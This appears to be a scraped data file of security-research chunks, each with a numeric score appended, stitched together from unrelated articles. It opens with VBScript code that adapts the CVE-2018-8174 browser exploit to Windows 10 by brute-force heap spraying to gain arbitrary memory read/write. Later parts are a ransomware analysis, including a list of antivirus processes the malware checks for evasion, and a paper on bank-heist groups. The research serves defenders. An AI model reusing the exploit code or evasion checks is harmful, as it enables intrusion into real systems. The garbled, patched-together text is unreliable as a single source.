CVE-2018-8174’s exploit uses a one-shot approach for attempting to pull off the type confusion attack, meaning that only a single new object is created after the destruction of reuseObjectA_arr. As we explained before, this will only reliably work on Windows systems prior to Windows 8, which lack the LFH Allocation Order Randomization feature.
To make this exploit work on Windows 10 systems, we can implement a brute-force approach for attempting the type confusion attack. Instead of creating a single new object, we can mass-create new objects to ensure the freed 0x108 allocation will ultimately get assigned into one of them.
Here’s how the code can be transformed into implementing a brute-force approach:
Set reuseObjectA_arr=New ReuseClass
...
Class ReplacingClass_Array
Public Default Property Get Q
Dim objectImitatingArray",0.012942453337378312
"Q=CDbl(""174088534690791e-324"") ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0",0.012428219685163056
"For i=0 To 6
DecrementRefcount(reuseObjectA_arr)
Next",0.014279858797362044
"For i=0 to UBound(UafArrayA)
Set objectImitatingArray=New FakeReuseClass
objectImitatingArray.mem = FakeArrayString
For j=0 To 6
Set UafArrayA(i,j)=objectImitatingArray
Next
Next
End Property
End Class
Here’s a visualization of the above code’s logic in action:",0.016037766088662586
UafArrayA(38) receives the same 0x108 allocation (Vval) as reuseObjectA_arr,0.010292026643282548
"After the UafArrayA array has been mass-filled with new FakeReuseClass objects and the mem=Value assignment completes, we can iterate over the array and find the object whose mem variable has been successfully corrupted to become an array:",0.009545772314570322
"For i=0 To UBound(UafArrayA)
Err.Clear
a = UafArrayA(i,0).mem(Empty16BString_addr)
If Err.Number = 0 Then
Exit For
End If
Next
If i > UBound(UafArrayA) Then
MsgBox(""Could not find an object corrupted by reuseObjectA_arr"")
Else
MsgBox(""Got UafArrayA_obj from UafArrayA("" & i & "")"")
Set UafArrayA_obj = UafArrayA(i,0)
End If",0.023850692923044536
"The corrupted object will be the only one not to cause an exception to be thrown on line 3. Once we find it, it can be referenced with any index, allowing to read and write all addresses in the process memory space.",0.011750700328711505
"With this fix to the original exploit, it now works on Windows 10 systems as well.",0.012560640134568146
PoC,0.008968366663579141
You can find the proof-of-concept file on the SophosLabs GitHub repository.,0.01766790363008175
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
Why malware authors keep using the same old Microsoft Office exploits,0.010259869077189232
"Written by
John Zorabedian",0.00826774006182307
"May 05, 2016",0.008579860524010274
Products & Services Security Tips Threat Research Exploit kits Gabor Szappanos Technical papers,0.010228364896211262
"SophosLabs Principal Malware Researcher Gabor Szappanos has closely studied Microsoft Office exploits for the past few years. We’ve previously covered his investigation of the Microsoft Word Intruder exploit creation kit, and his recent paper exploring the most popular Office exploit kits.
In a new research report, Gabor takes a closer look at the top four Office exploit kits used in the last quarter of 2015. He also reports which exploits were most commonly used in malicious documents, and shows us what families of malware were distributed by the studied samples.
As Gabor explains, malware authors are increasingly attracted to document exploits as the initial entry point for their attacks. The attackers spread their booby-trapped Office documents through phishing emails spammed out to large numbers of random recipients (cybercrime groups), or to a more select list of targets (APT groups).
Notably, the majority of Office exploits malware authors have been using in malicious documents are now several years old. The most popular exploit, CVE-2012-0158, has been around for well over three years now.",0.015291141993590385
"In recent years, some newer exploits have challenged the leader. CVE-2013-3906 and CVE-2014-0761 were also commonly used, and August 2015 saw a new Office exploit (CVE-2015-1641) start to appear more prominently. But none of these exploits has overtaken CVE-2012-0158, which still represented 48% of exploits used in the final quarter of 2015.
The chart below breaks down the document exploits used in reported incidents from the fourth quarter of 2015.",0.01267339245079413
"Why are older exploits still being used by malware authors?
As Gabor explains, these exploits continue to work against a large percentage of the user population, despite Microsoft having patched these security holes years ago.
Newer exploits may have more value to the cybercrooks, because even fewer users are expected to be patched against newer exploits, Gabor says. But it seems that the older exploits used by the most popular Office exploit kits can still get the job done.
Check out Gabor’s research paper for more of his insights into the most prominent Office exploits and the ways malware authors are using commercial exploit kits to carry out their attacks.
Staying safe from malicious Office documents",0.01314881882607477
"Patch promptly. The booby-trapped Office documents generated by exploit kits attack security holes that were patched years ago.
Keep your security software up to date. A good antivirus can block document attacks like this at several points, starting with the original inbound email.
Beware of unsolicited attachments. This can be hard when your job requires you to work through email, but avoid opening just any old document.
Consider using a stripped-down document viewer. Microsoft’s own Word Viewer, for example, is usually much less vulnerable than Word itself. It doesn’t support macros, either, which protects against Locky-type attacks.",0.013635337484722343
Image of Microsoft Office apps courtesy of dennizn / Shutterstock.com.,0.01306359055019457
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"2
",0.012344956490214498
"New Exploit Kit, Ransomware and AV evasion
Ransomware is still going strong and infecting countless PCs. We happened to stumble upon an interesting sample part of the Urausy family which bypassed detection on all major antivirus products for almost an entire day before slowly being detected. In this post we will give some information on its background (where it came from) and a detailed analysis of its binary.
Malware distribution
We first caught this piece of malware in our honeypots on 2013-03-06 at 09:09. It came from a drive-by download attack:",0.016211432752827326
"This is a new Exploit Kit, dubbed neutrino, identified in the wild by Kafeine. Its landing page follows a certain pattern in its URL: [domain name]/l[random letters]?f[random letters]=[random numbers].
Examples:
hxxp://{removed}/lddinxkq?fhdubnro=8866005
hxxp://{removed}/luvvy?fwchvcdyrsy=8422752
It uses two Java vulnerabilities:",0.009541670497212995
CVE-2012-1723,0.00927482674560054
"CVE-2013-0431
In CVE-2013-0431, the malicious Java Applet bypasses the security manager for Java version 7 update 11  by using a malicious serialized file, Jhelper.dat (should really be a .ser file extension but works the same).
While serialization and deserialization are legitimate features, they can be exploited to bypass security checks. Essentially, when Oracle introduced the new security levels withVersion 7 Updated 10, they missed that Applets using serialization can avoid calling an important method known as ‘fireAppletSSVValidation’. In plain English: malicious applets can run without any warnings or user interaction.",0.012182720726848895
"Following exploitation, a malware binary is downloaded by the java process and as you can see in the picture below, is encrypted:
This practice is becoming more and more common these days as it makes detection by looking at traffic packets more difficult. The file is swiftly decrypted by the java applet which in turns launches it.
Upon execution the binary connects to a remote server (hxxp://{removed}/news/ulul-ululul-ulululjbma-dkqvdikopislasycnzmzpzapieoqnveqxubpdyflslylbp-lmaa_perpih-xpns-quie.html) and downloads the ransomware interface directly onto the victim’s machine . Again, the bad guys are using obfuscation techniques to hide the content of the file. It includes images, CSS and an index.html file which are uncompressed in the user’s temp folder:",0.009537109471982386
"The malware binary then launches the (local) ransomware page:
Why use a local web page rather than an actual website? Perhaps because it is more resilient (a remote site could be taken down).
Technical File Analysis
Analysis reveals the ransomware binary to be a skype.dat variant that’s commonly seen in the wild. It’s called this because the ransomware renames itself to “skype.dat” and is placed in the user’s %appdata% folder, along with a configuration file called “skype.ini”. The skype.dat ransomware has nothing to do with the legitimate Skype program that millions of people use for VoIP communication.
The skype.dat ransomware takes advantage of multiple Windows processes and leverages native system API calls to facilitate its execution. Below is a chart describing the ransomware’s flow of execution.
Stage1
The skype.dat unpacker varies across ransomware samples. The sample we analyzed from the neutrino exploit payload has a very small Import Address Table (IAT) that doesn’t immediately reveal a lot of malicious intent, except perhaps VirtualAlloc. This call is legitimately used by Windows to allocate memory within the virtual address space of a process; however, malware often makes use of this call to create a new memory for unpacked code to reside. What you don’t see in this IAT that most packed malware has is LoadLibrary and GetProcAddress. These two calls allow the malware to access additional functions in other dynamic-link libraries (DLLs).
Let’s start looking at the code and see what we find.  The ransomware begins by registering a window class by calling RegisterClassA, which creates the WNDCLASS structure containing a window procedure.  After the window is created using CreateWindowExA, the window procedure is called repeatedly while the window is being created.
The window procedure contains a loop that intercepts messages while the window is created.  When the WM_CREATE message is sent to the application, the call to VirtualAlloc occurs.  Like we originally suspected, the ransomware’s real code resides here after being de-obfuscated using a custom routine.  For more about obfuscation, make sure to check out Obfuscation: Malware’s best friend on the Unpacked blog.
Stage2
The ransomware starts building a new IAT that’s much larger than before and checks for the presence of a debugger using ZwQueryInformationProcess. It’s quite common for malware to check for a debugger to see if it’s being analyzed, this sample is no different. Furthermore, the ransomware encodes all of its strings to make it more difficult to analyze.
The process id (PID) for Windows Explorer (explorer.exe) is retrieved since we’ll be targeting that process in this stage. A modified version of ntdll.dll is injected into Explorer, replacing the original one. This modified DLL hijacks the ZwClose API call and references new code that’s mapped within explorer.exe.
DLL injection has been used for a long time to run code within the address of another process, usually to escalate privileges. This particular injection method is interesting, however, in that it modifies a native system DLL and API to achieve its results and continue execution within another process.
The code within Explorer creates a Windows service host process (svchost.exe). This process is created in a suspended state and only resumed after code is injected via CreateRemoteThread. This process is where the ransomware will operate.
Stage3
The ransomware registers another window class and creates a non-overlapping window on a new desktop. The window procedure waits until the window is created and creates a Web Browser object along with five threads. As seen in a lot of ransomware, some of these threads limit the user’s interaction with the Operating System by preventing access to the Desktop and killing any launched Task Manager processes.
From here the ransomware performs an environment survey of the host and crafts a URL for downloading. Part of the host survey involves checking to see if the following AV processes are running on the host.",0.02154359852964649
"a2servece.exe
guardxservice.exe
aawService.exe
avp.exe
arcamainsv.exe
mcsvhost.exe
avastsvc.exe
ekrn.exe
avgcsrvx.exe
ccsvchst.exe
avguard.exe
winssnotify.exe
vsserv.exe
msmpeng.exe
clamWin.exe
acs.exe
clpsls.exe
pavprsrv.exe
dwengine.exe
scfservice.exe
ewidoguard.exe
coreserviceshell.exe
fpavserver.exe
vba32ldr.exe
fsdfwd.exe
vbcmserv.exe
gdscan.exe
iswsvc.exe",0.020157631487838668
"The ransomware then contacts a malicious URL and downloads files needed to operate. The ransom page demands users enter a Moneypak or Ukash code. This ransomware will also survive a reboot by adding skype.dat as a default shell upon system startup.
Conclusion
The skype.dat ransomware continues to be successful at locking down computers, preventing users from accessing their files. It seems unusual that this particular sample has evaded virus detection, although the ransomware’s original IAT is very small and doesn’t overtly indicate foul play. Crafting a binary in this way helps to defeat heuristic analysis from Antivirus scanners, and primarily why malware authors choose to obfuscate their programs.
If you become infected by ransomware, it’s critically important to remember not to pay the ransom. While this may restore access to your computer, you can never guarantee that criminals are going to live up to their end of the bargain. Remember to check out our ransomware blog for instructions on how to remove ransomware should you become infected with skype.dat.",0.015189133552484857
"Report prepared by:
Jerome Segura, Senior Security Researcher
Joshua Cannell, Malware Intelligence Analyst
",0.011991956552792948
VB2016 paper: Modern attacks against Russian financial institutions,0.010652513862729918
Jean-Ian Boutin & Anton Cherepanov,0.01131821309342973
"ESET, Slovakia",0.009768274617210415
Copyright © 2016 Virus Bulletin,0.009767502707145992
Abstract,0.009485057568311417
"Attacks on Internet banking users are no longer breaking news. In fact, several different banking trojans have, for almost a decade, been targeting Internet users making online banking transactions. These attacks are now routine even though the different attackers are constantly changing their methods and tools, as well as adjusting their techniques to counter the security measures introduced by defenders. However, something new has developed in the past few years: the rise of organized, specialized cybercriminal groups directly targeting financial institutions instead of their customers.",0.016616056326967943
"This trend has been seen in several countries, but banks in Russia seem to be targeted most frequently. It is now common to see an attacker group trying to spear-phish workers in these banks with the ultimate goal of stealing money by making fraudulent transfers or using other elaborate schemes. Some of them are also showing particular interest in the trading platforms used by the banks. We have seen a case where cybercriminals successfully gained unlawful access to a trading platform where they could issue orders on behalf of a victim bank. There have been some regulatory changes introduced in Russia lately, but this has not stopped the cybercriminals. We have even seen groups impersonating this new government body in order to better to lure their targets.",0.01585656398061952
"This paper will cover different groups targeting financial institutions worldwide, but especially in Russia. We will look at long lasting gangs, such as Buhtrap and Corkow, that have been relentlessly targeting the Russian financial sector. These groups are highly sophisticated and are spending a large amount of time compromising different entities to improve the coordination of their attacks. They also infiltrate the corporate network for a long time, finding the right workstation and carefully planning their final attack. Some groups use a shotgun approach where they try to infect as many computers as possible and then run tools to find the interesting ones, while others are doing background research before conducting their attacks and attempt to compromise only interesting targets. This paper will review the different tactics and tools used by the different groups. Another interesting aspect of these attacks is the usage of code-signing certificates. In fact, one group has used more than 20 different code-signing certificates in the past two years. A description of how these tools were used, the different attacks they performed and an estimate of the amounts that were stolen will also be given.",0.019232268407149977
"Finally, we will try to determine whether these types of attacks are likely to transfer to the rest of the world, as is often the case with Russian cybercrime. In fact, we have seen countless examples of Russians being the first victims of trends that are subsequently globalized.",0.014658966294996967
Introduction,0.012036720276026314
"Cybercriminals around the world have targeted online banking users for almost a decade now. While there is still money to be made from this activity, we are seeing more and more creative cybercriminals directly targeting banks instead of individuals or businesses. By doing so, they are able to steal millions of dollars from these entities.",0.014038136221714792
"There are more than 600 banks in Russia and not all of them have the same security measures. In the past few years, a growing number of organized and specialized groups have been robbing these financial institutions with the aid of malware. In this paper, we will try to shed some light on some of these groups and their tactics.What makes these types of attacks so interesting is the fact that the groups perpetrating them are highly specialized. While studying their tactics, we can make several connections to traditional so-called APT groups targeting different organizations for espionage. While the motive is different – financial gain in the case of these actors – the fact that they research their targets before attacking them, the way the hosts are compromised through spear phishing or strategic web compromise, and the fact that they are likely to persist in a network and study their victims for a lengthy period of time, is characteristic of more traditional espionage groups. Once they have a foothold in a targeted organization, they will try to reach interesting systems through lateral movement and learn more about the organization and its structure to ensure a smooth process when the time for their evil deeds comes.",0.01445314384939922
"They also use several techniques to blend in and hide the fact that a major breach has occurred. They commonly use third-party utilities, like a remote administration tool, to control a workstation. Some groups also use big, common botnets and cherry-pick the victims onto whose PCs they drop more sophisticated tools. Some groups build their own botnets while others buy compromised workstations from a fellow cybercriminal. Their use of off-the-shelf penetration test tools also makes attribution harder. As these attacks are usually kept secret by the targeted financial institutions, it is also hard to build a clear picture of the threat.",0.01394931197156224
"With concerns growing over attacks on their banks, in May 2015 the Russian government created a new CERT, FinCERT [1], whose responsibility is to tackle cybercrime targeting Russian financial institutions. Their mandate includes:",0.021263044703937473
Sharing information about attacks,0.008688171286493906
Providing analysis of tactics and tools used by cybercriminals,0.008965517348435648
Providing recommendations for best practice in information security for financial institutions.,0.015193503269680386
"Despite this new organization, financial crime against Russian financial institutions is still increasing. Moreover, the Russian Central Bank suspects that some banks are actually using cyber attacks as a way to hide previous attacks or to withdraw funds. Mr Georgy Luntovskiy, First Deputy Governor of the Bank of Russia, stated that three of the banks that had previously been subjected to cyber attacks had lost their licences [2]. In fact, cybercriminal groups can impair the financial stability of the targeted institutions by successfully stealing large amounts of money from them.",0.021726754496023903
"Interestingly, in the past few months, there have been a growing number of cases of banks being targeted in different regions of the world. What has started mainly as a Russia-centric phenomenon has clearly grown to the point where all financial institutions worldwide should take measures to prevent the types of fraud we will outline in the following sections.",0.01663577310540587
"In the first part of this paper, we will survey some of the groups perpetrating attacks on Russian financial institutions. We will then review the tools, tactics and procedures (TTPs) these groups use. The following section will discuss the different systems that are targeted by cybercriminals for financial gain.",0.016118809387558053
"Finally, we will try to determine whether these types of attacks are likely to migrate to the rest of the world, as is often the case with Russian cybercrime. In fact, we have seen countless examples of Russians being the first victims of trends that are subsequently globalized.",0.014677104647077943
Groups perpetrating these attacks,0.010678859441588084
There are not that many groups with the capabilities needed to perform large financial thefts like the ones this paper considers. The following are some groups who possess the necessary organization and sophistication to be able to pull off this type of cyber heist:,0.016488430356218498
Corkow,0.008283472275890325
"Alternative name:
Metel",0.008417513436677737
"First appearance:
2011",0.008975232220112095
"Targets:
banks; various businesses",0.011707699909689007
"Infection vectors:
exploit kits; spear phishing",0.010443593223699255
The Corkow group [3] has existed at least since 2011. This group uses custom modular malware detected by ESET as Win32/Corkow.,0.01514852570151326
"The group behind Corkow successfully compromised a trading terminal in a Russian bank, allowing them to trade on Moscow Exchange, the largest exchange group in Russia, through the financial institution's trading account. In February 2015, the attackers made several currency sale and purchase operations using the compromised trading terminal on behalf of the bank. As a result of this activity, the bank claimed losses of 244 million rubles (US$3.2 million) [4].",0.0174074621823459
"Another notorious case involving the Corkow group was noted in August 2015. The group successfully hacked a card processing centre, which allowed fraudsters to withdraw an estimated 500 million rubles (US$7.7 million) from ATMs [5].",0.013719862165564867
"According to ESET LiveGrid telemetry, the majority of detections are seen in Russia and Ukraine. At its peak, Corkow's botnet size was estimated at 300,000 infected computers.",0.01939348010800368
"The main infection vector used by this group is the Niteris Exploit Kit, a kit available only to trusted users. In order to find valuable targets, this group mainly uses a 'shotgun' approach. They try to grow their botnet as much as possible and subsequently find interesting and valuable infections. The Corkow group also uses spear-phishing emails with Rich Text Format (RTF) documents embedding exploits for Microsoft Word.",0.013028401103855725
This group is highly specialized and has attacked financial institutions with proper security measures. The fact that they were able to devise an attack on trading terminals clearly showcases their technical expertise. It also highlights a fact that is becoming more and more common in these attacks: the malware used is no longer central to the heist. It is just a tool used by resourceful criminals to attain their goal.,0.012670461037508796
Carbanak,0.010032949399173874
"Alternative name:
Anunak",0.00850029135904784
"First appearance:
2013",0.008706164407532024
"Targets:
banks; media/PR companies; retail; various businesses",0.014495510607027251
"Infection vectors:
spear phishing; selected victims in wider botnet; exploit kits",0.01115675192405352
"Starting in 2013, the Anunak [6] / Carbanak [7] group successfully stole millions from several banks, primarily in Russia. The group is very organized, capable of mounting and executing complex heists targeting financial institutions with strong defences. Although they were successful in robbing many banks in Russia, they also expanded their activities to target businesses elsewhere.",0.016253702493407518
"This group commits financial fraud in many different ways, but probably the most spectacular was their ability to control ATMs remotely to dispense cash at pre-defined times [8]. Accomplices would wait around the ATM until it started to automatically dispense cash, put the money in bags, and leave the scene without ever touching the ATM.",0.016972176331424338
"The main infection vector used by this group is spear phishing, but they also use exploit kits and select valuable victims from existing botnets. Once they have a foothold in a financial institution, they attempt to perform lateral movement to extend their network within the compromised company. They also deploy tools allowing them to spy on their victims and study their behaviour for weeks or even months before attempting any heist.",0.013347511227065234
Buhtrap,0.00909285815184846
"Alternative name:
Ratopak",0.008203896467869898
"First appearance:
2014",0.008468231237922508
"Targets:
banks; various businesses",0.011707699909689007
"Infection vectors:
spear phishing; exploit kits; strategic web compromise (a.k.a. watering hole attack)",0.01907601934715486
"This group appeared on our radar in 2014 and has been targeting Russian and Ukrainian businesses and financial institutions relentlessly [9]. Their main infection technique is spear phishing, although they have also been using exploit kits and strategic web compromise in some campaigns. Once they have a foothold in the targeted institution, they use a variety of custom and third-party tools to learn more about the network and behaviour of their victims.",0.016586031551355074
"ESET telemetry shows that the majority of detections for this group's malware occurred in Russia. Although they first targeted various types of Russian businesses, they soon turned their attention to financial institutions and, as such, might be the best illustration of groups transitioning from online banking users to the banks themselves. Although they were targeting specific individuals within financial institutions, they were targeting so many of them that discovering an attempted targeted attack on a Russian bank was no longer unusual. From August 2015 to February 2016, Buhtrap conducted 13 successful attacks on Russian banks for a total amount of 1.8 billion rubles (US$25.7 million) [10].",0.013054224974527462
"In fact, this group is unique in the way it spreads its tools, as they are dropped at the very beginning of the breach. The other groups tend to carefully choose the workstation on which they will deploy their most interesting tools, making the Buhtrap group 'louder' than the others.",0.015882387955915123
"In February 2016, the source code for most of their tools was leaked in underground forums. This was following several successful heists they had committed against several Russian banks. The message advertising the leak, posted on underground forum exploit.in, was from a disgruntled coder, complaining that he was not paid enough. The veracity of this statement could not be confirmed.",0.011126904698253504
Similarities,0.0084700396622166
"While there are other groups targeting banks, these are the major ones according to our tracking data. Common to all these groups is their professionalism and organizational capability. They are well-organized, APT-style groups with clear goals and member specialization. They research their targets beforehand for maximum efficiency and have deep knowledge of how bank systems and custom tools work.",0.016297059212990073
"These groups are composed of different people, each with different roles [11]. Some are regular employees while others are contractors who work for a fixed amount of money to produce software or perform specific tasks. The group usually comprises regionally distributed individuals and the leaders have strong ties with different actors in the Russian-speaking underground.",0.014875870056763274
"As stated above, these groups usually rely on contractors or third parties offering a variety of tools. Through them it is possible to draw weak links between these groups. For example, both the Buhtrap and Corkow groups used Niteris EK [12] as an infection vector. This kit is available only to trusted users, so the Corkow and Buhtrap groups share a common connection. Moreover, in various watering hole attacks, accounting portals or specialized websites for the registration of legal entities were redirecting to Niteris EK, and distributing either Buhtrap or Corkow malware to unsuspecting visitors [10].",0.011836598397134468
"They also all share a common infection vector: spear phishing with malicious attachments. In fact, all of them used either the same old exploits against Microsoft Office, or macros, to try to gain entry to the institutions' systems. Some of them have used third-party tools such as the Microsoft Word Intruder (MWI) kit [13], a framework sold to selected customers to automatically create RTF documents exploiting several known Word vulnerabilities.",0.011283666776277679
Figure 1: MWI logo as seen in kit documentation.,0.013873931722619415
"This is a common pattern and a lot of attacks perpetrated by these groups were preventable by applying basic countermeasures. Attackers will concentrate on the weakest link. As security measures to protect online banking users increase in efficiency, cybercriminals will turn towards easier and more lucrative targets, as some institutions' security processes are inadequate.",0.022417745667298594
"Once they get inside an organization, these groups will study their targets and install third-party tools for lateral movement or remote control. They all use Ammyy, LiteManager or a similar tool to control workstations remotely. The use of these tools makes breach detection harder as they are commonly used within these organizations. They also modify system settings to allow multiple remote sessions on a single computer. Some of them will also try to make malware analysis harder by encrypting key components of their toolset with a user-specific key. Corkow and Buhtrap encrypt their main DLLs using the hard drive serial number as a key. Execution on a different machine is thus impossible. This technique is not widely used in targeted attacks, making this additional connection between the groups interesting. The technique has been used in the past by malware such as Flashback and Rustock, but it is not widespread.",0.012816514376202903
"Once the campaign is completed, these groups cover their tracks. Carbanak and Buhtrap both overwrite the machine's master boot record (MBR) to make it unbootable. Corkow also has an 'uninstallation' command with a parameter used to destroy the machine's MBR.",0.015137122851208384
"While there are similarities between the ways these groups operate, we believe that they are different entities, as the main malware they use is quite different.",0.015984737458824116
"Apparent from the similarities between these groups, we can also infer that they influence each other. In fact, since the Carberp group arrest [14] and the subsequent code leak, its influence can be seen in many places in the Russian cybercrime landscape. Many believe that past members of the Carberp gang are now in the Carbanak group, and that in fact the main payload was based on Carberp code (hence the group name). Looking at the threat landscape, the Carberp group has had a lasting effect on cybercrime in Russia.",0.02016921378646297
"Tactics, tools and procedures",0.008068556696274487
"In this section, we will examine the different tactics, tools and procedures used by these advanced groups at each stage of the attack.",0.018121263886013095
Point of entry,0.007460504439728122
"While the final goal of the attack is the same, the groups are using different techniques to gain an initial foothold in the different financial institutions. The preferred methods are usually via emails or through drive-by downloads, especially strategic web compromise (SWC), a technique popularized by APT actors.",0.015892483009377956
Shotgun vs. targeted approach,0.012665454659788078
"Groups like Buhtrap and Carbanak usually prefer using targeted attacks where they will send spear-phishing emails to selected individuals working in financial institutions of interest. They may use either malicious links or malicious attachments to infect their targets. Both groups employed Microsoft Word Intruder kit, a kit advertised in underground forums [15]. This kit contains exploits for several different CVEs targeting Microsoft Word and can thus adapt to different Microsoft Office versions that might be installed on different targets.",0.012332862417824275
"The Buhtrap group uses something of a hybrid technique, somewhere between the shotgun and targeted approaches. We classify it as 'targeted' since they mostly use spear phishing, but they use a lengthy list of recipients. They send waves of spear‑phishing attacks, using different subjects such as an invitation to a conference or fake job offers [16].",0.016020477809158162
"Figure 2: Spear-phishing email sent to a bank employee, inviting him to a conference.",0.01635152869295753
"Another technique we have seen these groups use is to try to compromise websites that are likely to be visited by their targets. In one case, Buhtrap installers were bundled with the legitimate Ammyy Admin installer and distributed through the official Ammyy website [17]. Since this group is extensively using remote administration tools in its activities, compromising this website is a logical choice. We are unsure, however, whether they used it in conjunction with social engineering, cold-calling their targets and asking them to go to the legitimate website to download Ammyy Admin, or if they were only trying to compromise a large number of Ammyy Admin users.",0.012597636923269984
"Some groups are also leveraging existing botnets or implementing their own to reach their targets. They have good ties with big botnet operators from which they can buy access to selected financial institutions. Others, like Corkow, prefer to compromise as many workstations as possible and will then search for hidden gems via their admin panel. Although this technique does not allow the cybercriminals to pick their targets, the fact that the Corkow group uses Niteris EK still makes these attacks more targeted than regular crimeware. In fact, Russian accounting portals were redirecting their visitors to Niteris EK, meaning that they were, to a certain degree, able to control who would receive their payload.",0.010837570441556754
Figure 3 shows the classic infection steps that these groups use.,0.018485763552713586
Figure 3: Common infection pattern.,0.020583508553514207
Impersonating legal entities,0.009462048295595937
"In order to increase the probability of their victim opening the attachment or clicking on the link, many of these groups try to impersonate legitimate entities. In the introduction, we discussed how the Russian government created a new organization to provide help and guidance to Russian financial institutions defending against cybercrime. It did not take long before this organization was impersonated in a decoy document, as shown in Figure 4.",0.0193419424444784
Figure 4: Decoy document showing a bogus FinCERT advisory.,0.01583237622763356
"In this particular attack, run by the Buhtrap group, they also registered many domains with the FinCERT theme, again trying to legitimize their spear-phishing email. As is often the case with APT groups, significant care is taken by these groups when choosing domains that are used as C&Cs.",0.014856793815892777
"Group-IB reported [10] that, in one particularly bold move, Buhtrap sent a phishing attack to a trusted mailing list impersonating Gazprombank, the third-largest bank in Russia. As these lists are not accessible to the general public and emails usually come from trusted members, this adds a layer of legitimacy. In this case, the fraud was discovered quickly.",0.011179095653087168
Code-signing certificates,0.008091939184666663
"Carbanak and Buhtrap have both used several code-signing certificates. Several examples of their malware were signed by these certificates to increase their apparent legitimacy. Buhtrap used more than 20 certificates, all sharing a common feature, even amongst the ones that were used by Carbanak group: they were all awarded to Russian companies (e.g. wholesalers and builders) that do not immediately look like they develop code that needs to be signed. Also, we found in our databases only malicious files that were signed by these certificates, no legitimate files.",0.018356471657399176
Figure 5: Code-signing certificates used by Buhtrap (left) and Carbanak (right) display similarities.,0.017551987092582433
The Buhtrap group seemed able to get an endless supply of code‑signing certificates. The first time we would see them appear in the wild was often a couple of months after they had been awarded.,0.011978802925006748
Reconnaissance,0.010100194937299634
"Once an organization has been breached, some checks are run on the machine, either manually or automatically, to assess its value. Corkow's operator will check basic information that was initially collected on a compromised system through the administration panel and will then decide to drop a remote administration tool, usually Ammyy or the Visconti Backdoor, if further investigation is necessary. Once a manual check has been done, they can decide whether additional tools should be used. Carbanak was also doing similar checks before downloading and executing its main component on any given system.",0.012405807211713915
"Buhtrap does something similar, but has automated all these checks and will download additional packages only if the system successfully passes all the checks. They first check for signs of a sandbox or a malware analyst's computer, then make sure that the workstation is using either the Russian or Ukrainian language, and finally will check the list of processes and typed URLs for signs of banking applications. If these tests are successful, an additional package containing tools to monitor the workstation, a backdoor and pentesting tools, is dropped and executed on the machine.",0.012184433157362617
"Trying to avoid unnecessary installation of custom tools is understandable. Since these attacks are targeted, samples are not easy to find for security companies and thus usually go undetected for a long time. It also makes it harder for malware researchers to get hold of these samples and actively track the group before an attack is successful. The extent of a group's tools is often known only when an external company is called in to perform an incident response.",0.014219842889029999
Lateral movement,0.008767543863343108
"These groups are usually trying to expand their network of compromised systems in an institution of interest. They wish to find the workstation that will bring them maximum revenue, but also to persist as long as possible in the organization's network should one workstation be cleaned or decommissioned.",0.011209838797507143
Common penetration testing tools such as Metasploit and MimiKatz – tools that can retrieve Windows account passwords from memory – are frequently used. They will also scan for RDP/VNC and network ports to reach interesting workstations. Buhtrap had automated tools that could create additional accounts on a given workstation once administration rights were obtained.,0.015796375084216385
"To be able to run these tools, sometimes local privilege escalation (LPE) exploits are needed. This is one case where contacts with other underground actors become invaluable. Groups like these will be able to buy and have at their disposal several different LPEs that they can use depending on which Windows version they are executing.",0.017808094170711608
"The Holy Grail in these situations is often the domain controller where they can obtain credentials for all active domain accounts. Once the right workstations are compromised, the cybercriminals will lurk on the network, gathering as much information as possible to make their attack successful.",0.012692319072575176
Study of victim behaviour,0.010541841534355001
"Monitoring tools are deployed on key workstations. Corkow and Carbanak both have modules able to take screenshots and videos and upload them to the C&C server. Using these images and videos, the cybercriminals can learn more about how their victims are operating, a vital procedure if one wants to connect back to their workstations and perform tasks without raising red flags.",0.013002419424005707
"The main components of Corkow and Buhtrap are also able to detect when a smart card is present in a system. In order to issue financial orders, usually the system requests the employee to have his smart card inserted and unlocked. The malware can detect when the smart card is present in an attempt to bypass this additional security measure. Corkow also has an interesting additional feature: it is able to tell whether someone is currently using the computer by monitoring the mouse and keyboard inputs. This allows the operators to learn the workstation user's break and lunch habits.",0.012877766383721623
"To extend their knowledge of the institution's structure and capabilities, some groups actively try to access mail servers to monitor emails from employees. They can then specifically target the emails coming from the information security department. That way, they can learn when an anomaly is discovered and how the anomaly is resolved. This is a great source of information while trying to assess how best to conduct their heist.",0.013005036248406321
Theft,0.007286881217164809
"All of these groups are (ab)using remote administrator tools, most of them third-party tools like Ammyy Admin, LiteManager or TeamViewer. The final intent is to be able to mimic the worker's behaviour while performing transfers or other malicious activities through the remote administrator tool. In fact, in some cases they do not even need to deploy their main malware on all the machines, as having a remote administration program installed is enough.",0.011814441251745356
"However, sometimes the remote administrator tool is not enough, as custom applications are used by their targets. To get around this, the attackers need to develop their own custom tools.",0.012251490109806418
"There are many ways to steal money from financial institutions, and each way requires a custom methodology. Whether the cybercriminals want to wire funds through SWIFT, make ATMs dispense money automatically, play with internal databases to modify account balances, or issue financial orders, they need to know the different systems inside and out. They can gather this information by spying on their victims or, more conveniently, have someone in their group with this knowledge. Either way, this shows that these people have become experts at what they do.",0.013290467885121116
Covering their tracks,0.008501306249296792
"After they are done with a specific computer, these groups try to hide their tracks. Corkow malware can receive a SelfRemove command with the parameter DestroySystem that will not only overwrite the MBRs of all physical drives, but will also delete registry keys and overwrite configuration files with random data. Carbanak and Buhtrap use a similar tool that will erase the MBR, effectively making the computer unbootable. The Buhtrap gang also shows a message to the user saying that there has been a hard drive failure, adding credibility to the fact that the computer is no longer bootable. The likely result of this action is that their IT department will re-image the machine, making forensic work after the attack much harder.",0.015340972578831491
"Figure 6: Message shown to user after Buhtrap MBR eraser malware was run, claiming that there was a problem with the hard drive and that a reboot is necessary.",0.010411095228058831
"As discussed previously, another trick that is used by Buhtrap and Corkow to hinder forensics is the use of a system-dependent encryption key to encrypt key components on the victim's computer.",0.013828973439407699
Targeted system,0.006870038698975733
"When attackers get inside a financial institution's internal network, they can abuse different systems to achieve financial gains.",0.016322943714204508
Attacks on ATMs and bank card systems,0.010182511296570662
"This is by far the most spectacular category of attack and was used by both Corkow and Carbanak groups. Depending on the ATM model, the modus operandi is different. The first group was able to perform a rollback attack using the bank card system where they would withdraw money from an ATM and then do a 'rollback' on the account balance so that they could repeat the withdrawal process over and over again [18].",0.017604860729044658
